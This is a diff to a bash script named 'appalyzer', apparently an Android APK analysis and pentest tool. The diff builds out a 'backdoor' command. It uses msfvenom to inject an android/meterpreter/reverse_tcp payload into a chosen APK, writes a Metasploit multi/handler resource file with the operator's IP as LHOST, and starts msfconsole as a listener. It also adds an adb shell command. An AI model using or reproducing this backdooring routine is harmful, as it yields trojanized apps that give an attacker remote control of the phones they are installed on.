@@ -1,4 +1,5 @@
 #!/bin/bash
+ORIG=$PS1
 red () {
   echo -e '\033[1;31m'"$1"'\033[0m'
 }
@@ -78,7 +79,7 @@ echo ""
 wd=`pwd`
 while [ 1 -lt 2 ];do
   echo -n "$layer> "
-  read cmds
+  read -e cmds
   cmd=`echo "$cmds" | awk '{print $1}'`
   if [ "$cmd" == "load" ];then
     if [ "$apk" == "" ];then
@@ -171,18 +172,31 @@ while [ 1 -lt 2 ];do
   ### BACKDOOR APK FILE
   if [ "$cmd" == "backdoor" ];then
     echo
-    echo -n "Which interface do you want to listen on?"
+    echo -n "Which interface do you want to listen on? "
     read intf
-    ip="ifconfig $intf | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | grep -m 1 ."
+    ip=`ifconfig "$intf" | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | grep -m 1 .`
     ### FIND FULL PATH OF APK FILE TO BACKDOOR
-    mkdir /opt/appalyzer/"$apk"/backdoors
-    msfvenom --platform android -x /opt/appalyzer/"$apk"/"$apk" -p android/meterpreter/reverse_tcp LHOST=192.168.41.45 LPORT=4444 > /opt/appalyzer/"$apk"/backdoors/bkdr.apk
-    yellow "[#] APK was backdoored and can be installed using the command bkdrinstall"
+    if [ ! -d "/opt/appalyzer/$apk/backdoors" ];then
+      mkdir /opt/appalyzer/"$apk"/backdoors
+    fi
+    msfvenom --platform android -x /opt/appalyzer/"$apk"/"$apk" -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=4444 > /opt/appalyzer/"$apk"/backdoors/bkdr.apk
+    yellow "[#] APK was backdoored and can be installed using the command \033[1;31mbkdrinstall\033[0m"
     yellow "[#] The raw file can be found at /opt/appalyzer/$apk/backdoors/bkdr.apk"
+    echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $ip\nset LPORT 4444\nset exitonsession false\nexploit -j" > /opt/appalyzer/"$apk"/backdoors/msf.rc
+    yellow "[#] Starting postgresql and setting up handler in new terminal"
+    gnome-terminal -e "msfconsole -r /opt/appalyzer/$apk/backdoors/msf.rc" & disown
+  fi
+  ### INSTALL BACKDOOR ON DEVICE
+  if [ "$cmd" == "bkdrinstall" ];then
+    : ## CHECK IF DEVICE IS CONNECTED
   fi
   ### INSTALL APK ON DEVICE
   ### UNINSTALL APK FROM DEVICE
   ### ADB SHELL
+  if [ "$cmd" == "shell" ];then
+    ## CHECK IF DEVICE IS CONNECTED
+    adb shell
+  fi
   ### VIEW JAVA SOURCE CODE OF THE APP
   if [ "$cmd" == "decompile" ];then
     jc1="/opt/appalyzer/"
@@ -228,10 +242,13 @@ while [ 1 -lt 2 ];do
   if [ "$cmd" == "help" ];then
     if [ "$apk" = "" ];then ### NO APK IS LOADED
       echo -e "\n\033[1;33mload <apk file>\033[0m: loads apk for analysis\n\033[1;33mls\033[0m: list local files\n\033[1;33mcd\033[0m: change local directory"
+      echo -e "\033[1;33mshell\033[0m: drops into adb shell (device must be connected first)"
       echo -e "\033[1;33mhelp\033[0m: displays this screen\n\033[1;33mquit\033[0m: exit appalyzer\n\033[1;33mexit\033[0m: exit appalyzer\n"
     else ### lOADED APK
       echo -e "\n\033[1;33munload\033[0m: unloads apk from analysis framework\n\033[1;33mpermissions\033[0m: display permissions for loaded APK\n\033[1;33mdecompile\033[0m: decompiles apk into java source code"
+      echo -e "\033[1;33mbackdoor\033[0m: backdoors currently loaded apk using meterpreter and starts a listener"
       echo -e "\033[1;33minfo\033[0m: displays apk information\n\033[1;33mls\033[0m: list local files\n\033[1;33mcd\033[0m: change local directory"
+      echo -e "\033[1;33mshell\033[0m: drops into adb shell (device must be connected first)"
       echo -e "\033[1;33mhelp\033[0m: displays this screen\n\033[1;33mquit\033[0m: exit appalyzer\n\033[1;33mexit\033[0m: exit appalyzer\n"
     fi
   fi
